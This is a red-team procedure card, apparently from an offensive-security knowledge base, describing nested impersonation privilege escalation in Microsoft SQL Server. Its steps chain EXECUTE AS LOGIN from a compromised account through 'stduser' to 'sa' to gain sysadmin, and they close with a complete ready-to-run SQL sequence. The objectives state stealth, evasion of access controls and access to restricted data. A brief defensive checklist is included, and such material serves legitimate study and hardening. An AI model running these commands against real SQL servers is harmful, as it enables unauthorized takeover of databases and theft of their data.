---
id: 54ef9e6e-6414-4870-8f3c-2b46c38c8cd3
name: Nested-Impersonation-Privilege-Escalation-in-SQL-Server
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:21.094259+00:00'
updated_at: '2023-10-01T12:00:00.000000+00:00'
tactics:
  - '[[Privilege Escalation]]'
techniques:
  - '[[Valid Accounts]]'
  - '[[Abuse Elevation Control Mechanism]]'
sub_techniques:
  - '[[Domain Accounts]]'
tags:
  - sql-server
  - mssql
  - privilege-escalation
  - impersonation
  - nested-impersonation
commands:
  - '[[commands/mssql-check-sysadmin-role]]'
  - '[[commands/mssql-execute-as-sa-and-check-sysadmin]]'
  - '[[commands/mssql-execute-as-stduser-and-check-current]]'
  - '[[commands/mssql-get-current-user]]'
  - '[[commands/mssql-get-original-login]]'
platforms:
  - Windows
  - SQL Server
tools: []
validated: true
---

# Nested-Impersonation-Privilege-Escalation-in-SQL-Server

## Summary

This procedure demonstrates a nested impersonation attack in Microsoft SQL Server, where an attacker with a compromised account uses the EXECUTE AS statement to impersonate lower-privilege users and then escalate to higher-privilege accounts like 'sa' to gain sysadmin access, enabling lateral movement and data exfiltration.

## Description

A nested impersonation attack exploits SQL Server's EXECUTE AS functionality to chain impersonations, allowing privilege escalation without direct sysadmin credentials. Starting from a compromised account with IMPERSONATE permissions, the attacker impersonates a standard user ('stduser'), then from that context impersonates the system administrator ('sa'). This leverages trust relationships in linked servers or multi-instance environments to access sensitive data. The technique is stealthy as it uses legitimate SQL operations. It targets Windows-based SQL Server environments and requires initial access via valid credentials or injection. Expected outcomes include full server control, query execution as sysadmin, and evasion of basic access controls.

## Requirements

1. Compromised SQL Server login with IMPERSONATE permission on target users (e.g., 'stduser' and 'sa').
2. Access to a SQL Server instance via tools like sqlcmd, SSMS, or integrated authentication.
3. Knowledge of target login names (e.g., 'stduser' for low-priv, 'sa' for admin).
4. No multi-factor authentication on the SQL instance.

## Defense

- Implement the principle of least privilege: Restrict IMPERSONATE permissions to necessary accounts only.
- Enable multi-factor authentication for SQL logins and monitor for unusual EXECUTE AS usage.
- Regularly audit SQL Server logs for impersonation events, failed logins, and role membership changes.
- Use SQL Server Audit to track EXECUTE AS statements and context switches.
- Disable or rename the 'sa' account and enforce strong password policies.

## Objectives

1. Escalate privileges from a low-privilege account to sysadmin level.
2. Verify and maintain original session context for stealthy operations.
3. Access restricted data or execute commands not available to the initial compromised account.

## Instructions

### Step 1: Verify Current User and Sysadmin Status

**Context**: Begin by checking the current login context and sysadmin membership to establish baseline privileges before impersonation.

**Command** ([[commands/mssql-get-current-user]]):
```sql
SELECT SYSTEM_USER;
```

> This returns the current login name. Expected: Your compromised account name (e.g., 'compromised_user').

**Command** ([[commands/mssql-check-sysadmin-role]]):
```sql
SELECT IS_SRVROLEMEMBER('sysadmin');
```

> This checks sysadmin role membership. Expected: 0 (if not sysadmin) or 1 (if already elevated).

### Step 2: Impersonate Standard User and Verify Context

**Context**: Switch to a lower-privilege user context ('stduser') to simulate nesting, confirming the impersonation works and current user changes.

**Command** ([[commands/mssql-execute-as-stduser-and-check-current]]):
```sql
EXECUTE AS LOGIN = 'stduser';
SELECT SYSTEM_USER;
```

> This impersonates 'stduser' and queries the new context. Expected: 'stduser' as the output, confirming successful switch. If permission denied, ensure IMPERSONATE grant exists.

### Step 3: Escalate to Sysadmin via Nested Impersonation

**Context**: From the impersonated context, elevate to 'sa' to gain sysadmin privileges, demonstrating the nested attack.

**Command** ([[commands/mssql-execute-as-sa-and-check-sysadmin]]):
```sql
EXECUTE AS LOGIN = 'sa';
SELECT IS_SRVROLEMEMBER('sysadmin');
```

> This nests the impersonation to 'sa' and verifies sysadmin status. Expected: 1 for sysadmin membership. Use this context for sensitive queries.

### Step 4: Revert and Check Original Login

**Context**: After escalation, verify the original login to maintain session integrity and avoid detection from context mismatches.

**Command** ([[commands/mssql-get-original-login]]):
```sql
SELECT ORIGINAL_LOGIN();
```

> This returns the initial connecting login. Expected: Original compromised account name, ensuring traceability back to the true entry point.

### Step 5: Execute Full Nested Sequence

**Context**: Run the complete sequence using the provided code snippet to chain all impersonations in one session for efficient escalation.

**Code** ([[codes/SQL-Nested-Impersonation-Sequence]]):
```sql
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
EXECUTE AS LOGIN = 'stduser'
SELECT SYSTEM_USER
EXECUTE AS LOGIN = 'sa'
SELECT IS_SRVROLEMEMBER('sysadmin')
SELECT ORIGINAL_LOGIN()
SELECT SYSTEM_USER
```

> Execute this in a single query batch. Expected: Sequence of outputs showing context switches from original -> 'stduser' -> 'sa' (sysadmin=1), then original login verification. Use REVERT to exit contexts if needed.
